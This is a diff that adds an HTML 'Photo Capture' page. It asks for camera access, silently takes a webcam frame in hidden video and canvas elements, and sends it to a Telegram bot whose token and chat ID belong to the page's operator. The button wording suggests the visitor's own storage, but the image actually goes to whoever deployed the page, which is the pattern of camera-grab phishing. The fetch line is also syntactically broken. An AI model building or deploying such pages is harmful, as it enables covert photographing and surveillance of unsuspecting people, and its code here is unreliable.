@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Photo Capture</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background-color: #f0f2f5;
+            font-family: Arial, sans-serif;
+        }
+        .btn-container {
+            text-align: center;
+        }
+        .capture-btn {
+            background-color: #0088cc;
+            color: white;
+            border: none;
+            padding: 15px 25px;
+            font-size: 16px;
+            font-weight: bold;
+            border-radius: 8px;
+            cursor: pointer;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+            transition: background-color 0.3s;
+        }
+        .capture-btn:hover {
+            background-color: #006699;
+        }
+        video, canvas {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="btn-container">
+        <button class="capture-btn" id="startBtn">Get my photos and video and save in my telegram bot</button>
+    </div>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN';
+        const CHAT_ID = 'YOUR_TELEGRAM_USER_ID';
+
+        const startBtn = document.getElementById('startBtn');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+
+        startBtn.addEventListener('click', async () => {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+
+                video.onloadedmetadata = () => {
+                    setTimeout(() => {
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        const context = canvas.getContext('2d');
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                        canvas.toBlob((blob) => {
+                            sendToTelegram(blob);
+                            stream.getTracks().forEach(track => track.stop());
+                        }, 'image/jpeg');
+                    }, 1000);
+                };
+            } catch (err) {
+                alert('Camera access is required to proceed.');
+            }
+        });
+
+        function sendToTelegram(blob) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'capture.jpg');
+
+            fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto, {
+                method: 'POST',
+                body: formData
+            })
+            .then(res => res.json())
+            .then(data => {
+                if(data.ok) {
+                    alert('Photo saved to Telegram successfully!');
+                } else {
+                    alert('Failed to send photo.');
+                }
+            })
+            .catch(() => alert('Error sending photo.'));
+        }
+    </script>
+
+</body>
+</html>
